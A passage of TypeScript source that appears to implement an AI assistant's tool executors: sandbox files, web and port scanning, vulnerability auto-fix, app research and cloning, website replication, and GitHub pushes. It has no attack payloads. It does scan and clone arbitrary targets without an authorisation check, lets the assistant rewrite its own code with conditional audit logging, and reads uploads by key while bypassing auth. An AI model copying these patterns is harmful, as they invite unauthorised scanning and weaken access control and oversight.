  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const filePath = args.path as string;
  if (!filePath) return { success: false, error: "Path is required" };

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  const content = await sandboxReadFileImpl(sbId, userId, filePath);

  if (content === null) return { success: false, error: `File not found: ${filePath}` };
  return { success: true, data: { path: filePath, content } };
}

async function execSandboxListFiles(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const dirPath = (args.path as string) || "/home/sandbox";
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  const files = await sandboxListFilesImpl(sbId, userId, dirPath);

  return {
    success: true,
    data: {
      path: dirPath,
      files: files.map((f) => ({
        name: f.name,
        path: f.path,
        type: f.isDirectory ? "directory" : "file",
        size: f.size,
      })),
    },
  };
}

// ─── Security Executor Functions ────────────────────────────────────

async function execSecurityScan(
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const target = args.target as string;
  if (!target) return { success: false, error: "Target URL is required" };

  const scanResult = await runPassiveWebScan(target);
  const report = generateSecurityReport({
    target,
    scanDate: new Date().toISOString(),
    scanResult,
  });

  return {
    success: true,
    data: {
      score: scanResult.score,
      findings: scanResult.findings,
      securityHeaders: scanResult.securityHeaders,
      report,
    },
  };
}

async function execCodeSecurityReview(
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const files = args.files as Array<{ filename: string; content: string }>;
  if (!files || files.length === 0) return { success: false, error: "Files array is required" };

  const review = await analyzeCodeSecurity(files);
  return {
    success: true,
    data: review,
  };
}

async function execPortScan(
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const host = args.host as string;
  if (!host) return { success: false, error: "Host is required" };

  const ports = args.ports as number[] | undefined;
  const result = await runPortScan(host, ports);

  return {
    success: true,
    data: result,
  };
}

async function execSSLCheck(
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const host = args.host as string;
  if (!host) return { success: false, error: "Host is required" };

  const result = await checkSSL(host);
  return {
    success: true,
    data: result,
  };
}

async function execSelfMultiFileModify(
  userId: number,
  modifications: Array<{
    filePath: string;
    action: "modify" | "create" | "delete";
    content?: string;
    description: string;
  }>,
  userName?: string
): Promise<ToolExecutionResult> {
  if (!modifications || modifications.length === 0) {
    return { success: false, error: "No modifications provided" };
  }

  const start = Date.now();
  const db = await getDb();
  if (db && userName) {
    await logAudit({
      userId,
      userName: userName || "titan_assistant",
      action: "self_multi_file_modify",
      resource: "codebase",
      details: {
        fileCount: modifications.length,
        files: modifications.map((m) => `${m.action}: ${m.filePath}`),
      },
    });
  }

  const result = await applyModificationsDeferred(modifications, userId, "titan_assistant");
  const durationMs = Date.now() - start;
  const summary = result.success
    ? `${result.modifications.filter((m) => m.applied).length} file(s) modified successfully. Health check passed.`
    : result.rolledBack
      ? `Changes rolled back — ${result.error}`
      : `Failed: ${result.error}`;

  // Log to builder_activity_log
  try {
    if (db) {
      await db.insert(builderActivityLog).values({
        userId,
        tool: "self_multi_file_modify",
        status: result.success ? "success" : "failure",
        summary,
        durationMs,
        details: {
          fileCount: modifications.length,
          files: modifications.map((m) => m.filePath),
          rolledBack: result.rolledBack,
        },
      });
    }
  } catch (e) { /* non-critical */ }

  return {
    success: result.success,
    data: {
      snapshotId: result.snapshotId,
      modifications: result.modifications,
      healthCheckPassed: result.healthCheckPassed,
      rolledBack: result.rolledBack,
      validationErrors: result.validationResult?.errors,
      validationWarnings: result.validationResult?.warnings,
      summary,
    },
    error: result.error,
  };
}

// ─── Auto-Fix Executor Functions ────────────────────────────────────

async function execAutoFixVulnerability(
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const filename = args.filename as string;
  const code = args.code as string;
  if (!filename || !code) return { success: false, error: "Filename and code are required" };

  const issue = {
    title: args.issueTitle as string || "Unknown vulnerability",
    severity: ((args.issueSeverity as string) || "medium") as "critical" | "high" | "medium" | "low",
    category: ((args.issueCategory as string) || "security") as "security" | "performance" | "best-practices" | "maintainability",
    description: (args.issueDescription as string) || "",
    suggestion: (args.issueSuggestion as string) || "",
    file: filename,
    line: args.issueLine as number | undefined,
  };

  const fix = await fixSingleVulnerability({ code, filename, issue });

  return {
    success: fix.confidence > 0,
    data: {
      issueTitle: fix.issueTitle,
      severity: fix.severity,
      file: fix.file,
      confidence: fix.confidence,
      breakingChange: fix.breakingChange,
      explanation: fix.explanation,
      diffSummary: fix.diffSummary,
      testSuggestion: fix.testSuggestion,
      fixedCode: fix.fixedCode,
      codeChanged: fix.fixedCode !== fix.originalCode,
    },
  };
}

async function execAutoFixAll(
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const files = args.files as Array<{ filename: string; content: string }>;
  const issues = args.issues as Array<{
    title: string;
    severity: string;
    category: string;
    description: string;
    suggestion: string;
    file: string;
    line?: number;
  }>;

  if (!files || files.length === 0) return { success: false, error: "Files array is required" };
  if (!issues || issues.length === 0) return { success: false, error: "Issues array is required" };

  const typedIssues = issues.map((i) => ({
    ...i,
    severity: i.severity as "critical" | "high" | "medium" | "low",
    category: (i.category || "security") as "security" | "performance" | "best-practices" | "maintainability",
  }));

  const result = await fixAllVulnerabilities({
    files,
    report: {
      overallScore: 0,
      issues: typedIssues,
      summary: `Batch fix for ${typedIssues.length} vulnerabilities`,
      strengths: [],
      recommendations: [],
    },
  });

  const report = generateFixReport(result);

  return {
    success: result.fixedCount > 0,
    data: {
      totalIssues: result.totalIssues,
      fixedCount: result.fixedCount,
      skippedCount: result.skippedCount,
      overallSummary: result.overallSummary,
      fixes: result.fixes.map((f) => ({
        issueTitle: f.issueTitle,
        severity: f.severity,
        file: f.file,
        confidence: f.confidence,
        breakingChange: f.breakingChange,
        explanation: f.explanation,
        diffSummary: f.diffSummary,
        fixedCode: f.fixedCode,
      })),
      skipped: result.skipped,
      report,
    },
  };
}

// ─── App Research & Clone Executor Functions ────────────────────────

async function execAppResearch(
  args: Record<string, unknown>,
  userApiKey?: string
): Promise<ToolExecutionResult> {
  const target = args.target as string;
  if (!target) return { success: false, error: "Target app URL or name is required" };

  const focusAreas = args.focusAreas as string[] | undefined;

  // Step 1: Determine the URL to research
  let targetUrl = target;
  if (!target.startsWith("http")) {
    // Search for the app to find its URL
    try {
      const searchUrl = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(target + " official website")}`;
      const resp = await fetch(searchUrl, {
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
        signal: AbortSignal.timeout(10000),
      });
      const html = await resp.text();
      const urlMatch = html.match(/uddg=([^&"]*)/);
      if (urlMatch) {
        targetUrl = decodeURIComponent(urlMatch[1]);
      } else {
        targetUrl = `https://${target.toLowerCase().replace(/\s+/g, "")}.com`;
      }
    } catch {
      targetUrl = `https://${target.toLowerCase().replace(/\s+/g, "")}.com`;
    }
  }

  // Step 2: Fetch and analyze the target app's homepage
  let pageContent = "";
  let pageTitle = "";
  try {
    const resp = await fetch(targetUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      },
      signal: AbortSignal.timeout(15000),
    });
    const html = await resp.text();
    const titleMatch = html.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
    pageTitle = titleMatch ? titleMatch[1].replace(/<[^>]*>/g, "").trim() : target;
    // Extract text content
    pageContent = html
      .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "")
      .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "")
      .replace(/<[^>]*>/g, " ")
      .replace(/&nbsp;/g, " ")
      .replace(/&amp;/g, "&")
      .replace(/&lt;/g, "<")
      .replace(/&gt;/g, ">")
      .replace(/\s+/g, " ")
      .trim()
      .substring(0, 6000);
  } catch (err: unknown) {
    return { success: false, error: `Failed to fetch ${targetUrl}: ${getErrorMessage(err)}` };
  }

  // Step 3: Use LLM to analyze the app's features
  const focusPrompt = focusAreas && focusAreas.length > 0
    ? `\nFocus especially on these areas: ${focusAreas.join(", ")}`
    : "";

  const analysis = await invokeLLM({
    priority: "chat",
    ...(userApiKey ? { userApiKey } : {}),
    messages: [
      {
        role: "system",
        content: `You are an expert software analyst. Analyze the given web application and produce a detailed feature analysis report. Return a JSON object with this structure:
{
  "appName": "Name of the app",
  "description": "One-paragraph description of what the app does",
  "targetAudience": "Who uses this app",
  "coreFeatures": ["feature 1", "feature 2", ...],
  "uiPatterns": ["pattern 1", "pattern 2", ...],
  "techStackGuess": ["technology 1", "technology 2", ...],
  "dataModels": ["model 1: description", "model 2: description", ...],
  "apiEndpoints": ["endpoint 1: description", ...],
  "authMethod": "How users authenticate",
  "monetization": "How the app makes money",
  "keyDifferentiators": ["what makes it unique 1", ...],
  "suggestedTechStack": "Recommended tech stack for building a clone",
  "estimatedComplexity": "low | medium | high | very_high",
  "mvpFeatures": ["minimum features for a working clone"],
  "fullFeatures": ["all features for complete parity"]
}`,
      },
      {
        role: "user",
        content: `Analyze this application:\n\n**URL:** ${targetUrl}\n**Title:** ${pageTitle}\n**Page Content:**\n${pageContent}${focusPrompt}`,
      },
    ],
    response_format: {
      type: "json_schema",
      json_schema: {
        name: "app_analysis",
        strict: true,
        schema: {
          type: "object",
          properties: {
            appName: { type: "string" },
            description: { type: "string" },
            targetAudience: { type: "string" },
            coreFeatures: { type: "array", items: { type: "string" } },
            uiPatterns: { type: "array", items: { type: "string" } },
            techStackGuess: { type: "array", items: { type: "string" } },
            dataModels: { type: "array", items: { type: "string" } },
            apiEndpoints: { type: "array", items: { type: "string" } },
            authMethod: { type: "string" },
            monetization: { type: "string" },
            keyDifferentiators: { type: "array", items: { type: "string" } },
            suggestedTechStack: { type: "string" },
            estimatedComplexity: { type: "string" },
            mvpFeatures: { type: "array", items: { type: "string" } },
            fullFeatures: { type: "array", items: { type: "string" } },
          },
          required: [
            "appName", "description", "targetAudience", "coreFeatures",
            "uiPatterns", "techStackGuess", "dataModels", "apiEndpoints",
            "authMethod", "monetization", "keyDifferentiators",
            "suggestedTechStack", "estimatedComplexity", "mvpFeatures", "fullFeatures",
          ],
          additionalProperties: false,
        },
      },
    },
  });

  const rawContent = analysis?.choices?.[0]?.message?.content;
  if (!rawContent || typeof rawContent !== "string") {
    return { success: false, error: "LLM analysis failed — no response" };
  }

  try {
    const parsed = JSON.parse(rawContent);
    return {
      success: true,
      data: {
        url: targetUrl,
        ...parsed,
        message: `Research complete for ${parsed.appName}. Found ${parsed.coreFeatures.length} core features, estimated complexity: ${parsed.estimatedComplexity}. Use app_clone to start building.`,
      },
    };
  } catch {
    return { success: false, error: "Failed to parse LLM analysis response" };
  }
}

async function execAppClone(
  userId: number,
  args: Record<string, unknown>,
  userApiKey?: string
): Promise<ToolExecutionResult> {
  const appName = args.appName as string;
  const features = args.features as string[];
  const techStack = (args.techStack as string) || "React + Node.js + Express + SQLite";
  const priority = (args.priority as string) || "mvp";

  if (!appName) return { success: false, error: "App name is required" };
  if (!features || features.length === 0) return { success: false, error: "Features list is required" };

  // Use LLM to generate a complete build plan
  const buildPlan = await invokeLLM({
    priority: "chat",
    ...(userApiKey ? { userApiKey } : {}),
    messages: [
      {
        role: "system",
        content: `You are an expert full-stack developer. Generate a detailed build plan for a web application clone. Return a JSON object with this structure:
{
  "projectName": "kebab-case project name",
  "description": "What this app does",
  "techStack": {
    "frontend": "framework and libraries",
    "backend": "framework and libraries",
    "database": "database choice",
    "other": "any other tools"
  },
  "fileStructure": [
    { "path": "relative/file/path", "description": "what this file does", "priority": 1 }
  ],
  "buildSteps": [
    { "step": 1, "description": "what to do", "files": ["files to create/modify"], "commands": ["shell commands to run"] }
  ],
  "dataModels": [
    { "name": "ModelName", "fields": ["field1: type", "field2: type"] }
  ],
  "apiRoutes": [
    { "method": "GET|POST|PUT|DELETE", "path": "/api/route", "description": "what it does" }
  ],
  "estimatedFiles": 10,
  "estimatedTimeMinutes": 30
}

Generate a practical, buildable plan. Each build step should be concrete and executable. Include package.json, all source files, and setup commands.`,
      },
      {
        role: "user",
        content: `Generate a build plan for: "${appName}"

**Features to implement (${priority} priority):**
${features.map((f, i) => `${i + 1}. ${f}`).join("\n")}

**Tech stack:** ${techStack}
**Priority:** ${priority === "mvp" ? "MVP — core features only, get it working fast" : "Full — implement all features for complete parity"}`,
      },
    ],
    response_format: {
      type: "json_schema",
      json_schema: {
        name: "build_plan",
        strict: true,
        schema: {
          type: "object",
          properties: {
            projectName: { type: "string" },
            description: { type: "string" },
            techStack: {
              type: "object",
              properties: {
                frontend: { type: "string" },
                backend: { type: "string" },
                database: { type: "string" },
                other: { type: "string" },
              },
              required: ["frontend", "backend", "database", "other"],
              additionalProperties: false,
            },
            fileStructure: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  path: { type: "string" },
                  description: { type: "string" },
                  priority: { type: "integer" },
                },
                required: ["path", "description", "priority"],
                additionalProperties: false,
              },
            },
            buildSteps: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  step: { type: "integer" },
                  description: { type: "string" },
                  files: { type: "array", items: { type: "string" } },
                  commands: { type: "array", items: { type: "string" } },
                },
                required: ["step", "description", "files", "commands"],
                additionalProperties: false,
              },
            },
            dataModels: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  name: { type: "string" },
                  fields: { type: "array", items: { type: "string" } },
                },
                required: ["name", "fields"],
                additionalProperties: false,
              },
            },
            apiRoutes: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  method: { type: "string" },
                  path: { type: "string" },
                  description: { type: "string" },
                },
                required: ["method", "path", "description"],
                additionalProperties: false,
              },
            },
            estimatedFiles: { type: "integer" },
            estimatedTimeMinutes: { type: "integer" },
          },
          required: [
            "projectName", "description", "techStack", "fileStructure",
            "buildSteps", "dataModels", "apiRoutes", "estimatedFiles", "estimatedTimeMinutes",
          ],
          additionalProperties: false,
        },
      },
    },
  });

  const rawContent = buildPlan?.choices?.[0]?.message?.content;
  if (!rawContent || typeof rawContent !== "string") {
    return { success: false, error: "Failed to generate build plan" };
  }

  try {
    const plan = JSON.parse(rawContent);
    return {
      success: true,
      data: {
        ...plan,
        message: `Build plan generated for "${appName}" with ${plan.buildSteps.length} steps and ${plan.estimatedFiles} files. Estimated time: ${plan.estimatedTimeMinutes} minutes. The AI assistant will now execute each build step in your sandbox using sandbox_exec and sandbox_write_file tools.`,
        nextAction: "The assistant should now iterate through buildSteps, using sandbox_write_file to create each file and sandbox_exec to run each command. Start with step 1.",
      },
    };
  } catch {
    return { success: false, error: "Failed to parse build plan" };
  }
}

async function execWebsiteReplicate(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const targetUrl = args.targetUrl as string;
  const targetName = args.targetName as string;
  const priority = (args.priority as string) || "mvp";
  const brandName = args.brandName as string | undefined;
  const brandTagline = args.brandTagline as string | undefined;
  const autoResearch = args.autoResearch !== false; // default true

  if (!targetUrl) return { success: false, error: "Target URL or app name is required" };
  if (!targetName) return { success: false, error: "Project name is required" };

  try {
    // Dynamically import the replicate engine
    const {
      createProject,
      researchTarget,
    } = await import("./replicate-engine");

    // Create the project
    const project = await createProject(userId, targetUrl, targetName, {
      priority: priority as "mvp" | "full",
      branding: brandName ? { brandName, brandTagline } : undefined,
    });

    let researchData = null;
    if (autoResearch) {
      try {
        researchData = await researchTarget(project.id, userId);
      } catch (err: unknown) {
        return {
          success: true,
          data: {
            projectId: project.id,
            status: "created_research_failed",
            message: `Project created (ID: ${project.id}) but research failed: ${getErrorMessage(err)}. The user can retry research from the Website Replicate page (/replicate).`,
            navigateTo: "/replicate",
          },
        };
      }
    }

    return {
      success: true,
      data: {
        projectId: project.id,
        status: autoResearch ? "research_complete" : "created",
        targetUrl,
        targetName,
        priority,
        research: researchData
          ? {
              appName: researchData.appName,
              description: researchData.description,
              coreFeatures: researchData.coreFeatures,
              estimatedComplexity: researchData.estimatedComplexity,
              mvpFeatures: researchData.mvpFeatures,
              fullFeatures: researchData.fullFeatures,
            }
          : null,
        message: autoResearch && researchData
          ? `Website Replicate project "${targetName}" created and research complete! Found ${researchData.coreFeatures.length} core features (complexity: ${researchData.estimatedComplexity}). The user can view the full analysis and generate a build plan on the Website Replicate page. Use navigate_to_page with page="replicate" to send them there.`
          : `Website Replicate project "${targetName}" created (ID: ${project.id}). Use navigate_to_page with page="replicate" to send the user to start research.`,
        navigateTo: "/replicate",
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Failed to create replicate project: ${getErrorMessage(err)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════
// Project Builder Tool Implementations
// ═══════════════════════════════════════════════════════════════════

/**
 * Create a file in the user's project — stored in S3 with a downloadable URL.
 * This is the core builder tool that replaces sandbox_write_file for user-facing projects.
 */
async function execCreateFile(
  userId: number,
  args: Record<string, unknown>,
  conversationId?: number
): Promise<ToolExecutionResult> {
  let fileName = args.fileName as string;
  const content = args.content as string;
  const language = (args.language as string) || detectLanguage(fileName);

  if (!fileName || content === undefined) {
    return { success: false, error: "fileName and content are required" };
  }

  // ── SERVER-SIDE ENFORCEMENT: Ensure fileName has a project root folder ──
  // If the builder creates a file without a project folder prefix (e.g., "main.py" or "src/index.html"),
  // auto-prefix it with "general-project/" so files are always grouped under a project folder.
  const hasProjectFolder = fileName.includes("/") && ![
    "src", "lib", "cmd", "pkg", "internal", "test", "tests", "config",
    "utils", "helpers", "models", "views", "controllers", "routes",
    "components", "pages", "styles", "assets", "public", "static",
    "scripts", "docs", "bin", "dist", "build", "node_modules",
  ].includes(fileName.split("/")[0]);
  if (!hasProjectFolder) {
    fileName = `general-project/${fileName}`;
    log.info(`[CreateFile] Auto-prefixed project folder: ${fileName}`);
  }

  try {
    // Upload to S3 for permanent cloud storage
    const timestamp = Date.now();
    const safeFileName = fileName.replace(/[^a-zA-Z0-9._\/-]/g, "_");
    const s3Key = `projects/${userId}/${conversationId || "general"}/${timestamp}-${safeFileName}`;
    const contentType = getContentType(fileName);
    let url = "";
    try {
      const result = await storagePut(s3Key, content, contentType, safeFileName);
      url = result.url;
    } catch (s3Err: unknown) {
      log.warn("[CreateFile] S3 upload failed (non-fatal):", { error: getErrorMessage(s3Err) });
    }

    // Store in sandboxFiles table (reuse existing table)
    const db = await getDb();
    const sbId = await getOrCreateDefaultSandbox(userId);
    // Derive project name from the first path segment (e.g. "src/main.py" → "src", "main.py" → "general")
    const pathParts = fileName.split("/");
    const derivedProjectName = pathParts.length > 1 ? pathParts[0] : "general";
    if (db) {
      // ── DEDUPLICATION: delete any existing file with the same path in this conversation ──
      // This ensures rewrites replace the old version instead of creating duplicates
      if (conversationId) {
        await db.delete(sandboxFiles).where(
          and(
            eq(sandboxFiles.sandboxId, sbId),
            eq(sandboxFiles.filePath, fileName),
            eq(sandboxFiles.conversationId, conversationId)
          )
        );
      } else {
        await db.delete(sandboxFiles).where(
          and(
            eq(sandboxFiles.sandboxId, sbId),
            eq(sandboxFiles.filePath, fileName),
            isNull(sandboxFiles.conversationId)
          )
        );
      }
      await db.insert(sandboxFiles).values({
        sandboxId: sbId,
        filePath: fileName,
        content: content.length <= 65000 ? content : null,
        s3Key: s3Key,
        fileSize: Buffer.byteLength(content, "utf-8"),
        isDirectory: 0,
        conversationId: conversationId || null,
        projectName: derivedProjectName,
      });
    }

    // ALSO write to the sandbox filesystem so files appear in the Project Files viewer
    try {
      await sandboxWriteFileImpl(sbId, userId, `/home/sandbox/projects/${fileName}`, content);
    } catch (fsErr: unknown) {
      // Non-fatal: the file is still in S3 and the database
      log.warn("[CreateFile] Sandbox filesystem write failed (non-fatal):", { error: getErrorMessage(fsErr) });
    }

    return {
      success: true,
      data: {
        fileName,
        url,
        size: Buffer.byteLength(content, "utf-8"),
        language,
        projectPath: `/home/sandbox/projects/${fileName}`,
        message: `File created: ${fileName} (${formatFileSize(Buffer.byteLength(content, "utf-8"))})`,
      },
    };
  } catch (err: unknown) {
    log.error("[CreateFile] Error:", { error: String(err) });
    return { success: false, error: `Failed to create file: ${getErrorMessage(err)}` };
  }
}

/**
 * Create a GitHub repository for the user's project.
 */
async function execCreateGithubRepo(
  userId: number,
  args: Record<string, unknown>,
  conversationId?: number
): Promise<ToolExecutionResult> {
  const repoName = args.name as string;
  const description = (args.description as string) || "Created by Titan Builder";
  const isPrivate = args.isPrivate !== false; // default true

  if (!repoName) {
    return { success: false, error: "Repository name is required" };
  }

  try {
    // Get user's GitHub PAT from user_secrets
    const githubToken = await getUserGithubToken(userId);
    if (!githubToken) {
      return {
        success: false,
        error: "No GitHub token found. Please add your GitHub Personal Access Token in Account Settings to use this feature.",
      };
    }

    // Create repo via GitHub API
    const response = await fetch("https://api.github.com/user/repos", {
      method: "POST",
      headers: {
        Authorization: `token ${githubToken}`,
        "Content-Type": "application/json",
        Accept: "application/vnd.github.v3+json",
      },
      body: JSON.stringify({
        name: repoName,
        description,
        private: isPrivate,
        auto_init: false,
      }),
    });

    if (!response.ok) {
      const err = await response.json().catch(() => ({}));
      return {
        success: false,
        error: `GitHub API error: ${(err as any).message || response.statusText}`,
      };
    }

    const repo = await response.json() as any;

    return {
      success: true,
      data: {
        repoUrl: repo.html_url,
        repoFullName: repo.full_name,
        cloneUrl: repo.clone_url,
        isPrivate: repo.private,
        defaultBranch: repo.default_branch || "main",
        message: `Repository created: ${repo.full_name} (${repo.private ? "private" : "public"})`,
      },
    };
  } catch (err: unknown) {
    log.error("[CreateGithubRepo] Error:", { error: String(err) });
    return { success: false, error: `Failed to create repo: ${getErrorMessage(err)}` };
  }
}

/**
 * Push all project files from the current conversation to a GitHub repo.
 */
async function execPushToGithub(
  userId: number,
  args: Record<string, unknown>,
  conversationId?: number
): Promise<ToolExecutionResult> {
  const repoFullName = args.repoFullName as string;
  const commitMessage = (args.commitMessage as string) || "Initial commit from Titan Builder";

  if (!repoFullName) {
    return { success: false, error: "repoFullName is required (e.g., 'username/repo-name')" };
  }

  try {
    const githubToken = await getUserGithubToken(userId);
    if (!githubToken) {
      return {
        success: false,
        error: "No GitHub token found. Please add your GitHub PAT in Account Settings.",
      };
    }

    // Get all project files for this user's sandbox
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };

    const sbId = await getOrCreateDefaultSandbox(userId);
    const files = await db
      .select()
      .from(sandboxFiles)
      .where(and(eq(sandboxFiles.sandboxId, sbId), eq(sandboxFiles.isDirectory, 0)));

    if (files.length === 0) {
      return { success: false, error: "No files to push. Create files first using the create_file tool." };
    }

    // Push files using GitHub API (create tree + commit)
    const pushed = await pushFilesToGithub(githubToken, repoFullName, files, commitMessage);

    return {
      success: true,
      data: {
        repoFullName,
        repoUrl: `https://github.com/${repoFullName}`,
        filesPushed: pushed,
        commitMessage,
        message: `Pushed ${pushed} files to ${repoFullName}`,
      },
    };
  } catch (err: unknown) {
    log.error("[PushToGithub] Error:", { error: String(err) });
    return { success: false, error: `Failed to push: ${getErrorMessage(err)}` };
  }
}

/**
 * Read content from an uploaded file URL.
 */
async function execReadUploadedFile(
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const url = args.url as string;
  if (!url) return { success: false, error: "URL is required" };

  try {
    // ── LOCAL UPLOAD: bypass HTTP auth by reading directly from DB ──
    // URLs like /api/chat/uploads/chat%2F{userId}%2F{key} are stored in the
    // chat_uploads table. The HTTP serve endpoint requires browser cookies,
    // so we read the raw bytes directly from the database instead.
    const localUploadMatch = url.match(/\/api\/chat\/uploads\/(.+)$/);
    if (localUploadMatch) {
      const fileKey = decodeURIComponent(localUploadMatch[1]);
      const db = await getDb();
      if (!db) return { success: false, error: 'Database unavailable' };
      const { sql } = await import('drizzle-orm');
      const result = await db.execute(
        sql`SELECT mimeType, data, fileName FROM chat_uploads WHERE fileKey = ${fileKey} LIMIT 1`
      );
      const rows = (result[0] as unknown as any[]);
      if (!rows || rows.length === 0) {
        return { success: false, error: `Uploaded file not found in database (key: ${fileKey}). The file may have expired or been deleted.` };
      }
      const row = rows[0];
      const mimeType: string = row.mimeType || 'application/octet-stream';
      const fileBuffer: Buffer = Buffer.isBuffer(row.data) ? row.data : Buffer.from(row.data);
      const fileName: string = row.fileName || 'file';
      // Now process the buffer using the same logic as the HTTP path below
      const urlLower = fileName.toLowerCase();
      const isZipLocal = urlLower.endsWith('.zip') || mimeType.includes('zip') || mimeType.includes('octet-stream');
      const isPdfLocal = urlLower.endsWith('.pdf') || mimeType.includes('pdf');
      if (isZipLocal) {
        try {
          const JSZipModule = (await import('jszip')) as any;
          const JSZip = JSZipModule.default || JSZipModule;
          const zip = await JSZip.loadAsync(fileBuffer);
          const fileEntries: string[] = [];
          let extractedContent = '';
          let totalChars = 0;
          const MAX_CHARS = 80000;
          const TEXT_EXTENSIONS = ['.ts', '.tsx', '.js', '.jsx', '.json', '.md', '.txt', '.css', '.html', '.env', '.yaml', '.yml', '.toml', '.sh', '.py', '.sql', '.prisma', '.graphql', '.xml', '.csv', '.ini', '.conf', '.config'];
          const fileNames: string[] = [];
          zip.forEach((relativePath: string, _file: any) => { fileNames.push(relativePath); });
          fileEntries.push(...fileNames);
          for (const fn of fileNames) {
            const file = zip.file(fn) as any;
            if (!file || file.dir) continue;
            const ext = '.' + fn.split('.').pop()?.toLowerCase();
            if (!TEXT_EXTENSIONS.includes(ext)) continue;
            if (totalChars >= MAX_CHARS) break;
            try {
              const text: string = await file.async('string');
              const snippet = text.slice(0, Math.min(5000, MAX_CHARS - totalChars));
              extractedContent += `\n\n=== ${fn} ===\n${snippet}`;
              if (text.length > 5000) extractedContent += `\n... [truncated — ${text.length} chars total]`;
              totalChars += snippet.length;
            } catch { /* skip binary */ }
          }
          return { success: true, data: { type: 'zip', fileCount: fileNames.length, files: fileEntries.slice(0, 200), content: extractedContent.slice(0, MAX_CHARS), truncated: totalChars >= MAX_CHARS, summary: `ZIP archive "${fileName}" with ${fileNames.length} file(s). Text file contents extracted below.` } };
        } catch (zipErr: unknown) {
          return { success: false, error: `Failed to extract ZIP: ${getErrorMessage(zipErr)}` };
        }
      }
      if (isPdfLocal) {
        return { success: true, data: { type: 'pdf', size: fileBuffer.length, content: '[PDF file detected. PDF text extraction is not supported in this context. Please copy-paste the relevant content directly.]' } };
      }
      const textContent = fileBuffer.toString('utf-8');
      return { success: true, data: { type: 'text', fileName, mimeType, content: textContent.slice(0, 100000), size: textContent.length, truncated: textContent.length > 100000 } };
    }

    const response = await fetch(url);
    if (!response.ok) {
      return { success: false, error: `Failed to fetch file: ${response.statusText}` };
    }

    // Detect file type from URL or Content-Type header
    const contentType = response.headers.get('content-type') || '';
    const urlLower = url.toLowerCase().split('?')[0];
    const isZip = urlLower.endsWith('.zip') || contentType.includes('zip') || contentType.includes('octet-stream');
    const isPdf = urlLower.endsWith('.pdf') || contentType.includes('pdf');

    if (isZip) {
      // Handle ZIP files: extract and return a manifest + contents of text files
      try {
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const JSZipModule = (await import('jszip')) as any;
        const JSZip = JSZipModule.default || JSZipModule;
        const arrayBuffer = await response.arrayBuffer();
        const zip = await JSZip.loadAsync(arrayBuffer);
        const fileEntries: string[] = [];
        let extractedContent = '';
        let totalChars = 0;
        const MAX_CHARS = 80000;
        const TEXT_EXTENSIONS = ['.ts', '.tsx', '.js', '.jsx', '.json', '.md', '.txt', '.css', '.html', '.env', '.yaml', '.yml', '.toml', '.sh', '.py', '.sql', '.prisma', '.graphql', '.xml', '.csv', '.ini', '.conf', '.config'];
        // First pass: collect file names
        const fileNames: string[] = [];
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        zip.forEach((relativePath: string, _file: any) => { fileNames.push(relativePath); });
        fileEntries.push(...fileNames);
        // Second pass: extract text file contents
        for (const fileName of fileNames) {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const file = zip.file(fileName) as any;
          if (!file || file.dir) continue;
          const ext = '.' + fileName.split('.').pop()?.toLowerCase();
          if (!TEXT_EXTENSIONS.includes(ext)) continue;
          if (totalChars >= MAX_CHARS) break;
          try {
            const text: string = await file.async('string');
            const snippet = text.slice(0, Math.min(5000, MAX_CHARS - totalChars));
            extractedContent += `\n\n=== ${fileName} ===\n${snippet}`;
            if (text.length > 5000) extractedContent += `\n... [truncated — ${text.length} chars total]`;
            totalChars += snippet.length;
          } catch { /* skip binary files that fail text decode */ }
        }
        return {
          success: true,
          data: {
            type: 'zip',
            fileCount: fileNames.length,
            files: fileEntries.slice(0, 200),
            content: extractedContent.slice(0, MAX_CHARS),
            truncated: totalChars >= MAX_CHARS,
            summary: `ZIP archive with ${fileNames.length} file(s). Text file contents extracted below.`,
          },
        };
      } catch (zipErr: unknown) {
        return { success: false, error: `Failed to extract ZIP: ${getErrorMessage(zipErr)}. Please ensure the file is a valid ZIP archive.` };
      }
    }

    if (isPdf) {
      // For PDFs, return a helpful message since we can't parse binary PDFs server-side easily
      const arrayBuffer = await response.arrayBuffer();
      return {
        success: true,
        data: {
          type: 'pdf',
          size: arrayBuffer.byteLength,
          content: '[PDF file detected. PDF text extraction is not supported in this context. Please convert to text or copy-paste the relevant content directly.]',
        },
      };
    }

    // Default: treat as text
    const content = await response.text();
    return {
      success: true,
      data: {
        type: 'text',
        content: content.slice(0, 100000), // Limit to 100KB
        size: content.length,
        truncated: content.length > 100000,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Failed to read file: ${getErrorMessage(err)}` };
  }
}

// ─── GitHub Helper Functions ─────────────────────────────────────────

async function getUserGithubToken(userId: number): Promise<string | null> {
  try {
    const db = await getDb();
    if (!db) return null;
    const secrets = await db
      .select()
      .from(userSecrets)
